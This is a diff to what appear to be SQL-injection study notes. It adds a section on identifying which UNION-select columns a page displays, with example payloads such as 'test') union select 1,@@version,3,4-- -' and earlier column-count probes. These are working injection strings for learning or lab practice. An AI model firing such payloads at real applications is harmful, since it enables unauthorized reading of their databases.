@@ -99,3 +99,15 @@ cn' UNION select 1,2,3--
 cn' UNION select 1,2,3,4-- 
 # This gets us results, so we know we have 4 columns
 ```
+
+### Displayed Columns
+Not all columns may be displayed, There's a couple of ways to figure out which columns are displaying data.
+
+We can use numbers:
+```sql
+test') union select 1,2,3,4-- -
+```
+Or we can use `@@version` and cycle through our available columns to see which ones actually display the version:
+```sql
+test') union select 1,@@version,3,4-- -
+```
